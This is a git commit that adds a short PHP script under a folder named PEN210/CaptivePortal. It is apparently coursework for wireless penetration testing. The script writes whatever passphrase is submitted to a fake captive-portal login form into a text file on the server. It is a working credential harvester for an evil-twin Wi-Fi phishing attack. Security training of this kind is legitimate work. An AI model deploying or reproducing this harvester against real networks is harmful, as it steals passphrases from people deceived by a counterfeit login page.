9077ce8a1e5e8c124ae11644ca886f1a5f3b2f6a
I3N0dWZm <128362878+I3N0dWZm@users.noreply.github.com>
2023-08-23 15:54:39 +0100

    Add files via upload

---
+++ PEN210/CaptivePortal/login_check2.php
@@ -0,0 +1,12 @@
+<?php
+$data=$_POST['passphrase'];
+
+#echo $data;
+
+$file = '/data/people.txt';
+$current = file_get_contents($file);
+$current .= $data. "" ."\n";
+file_put_contents($file, $current);
+
+
+?>
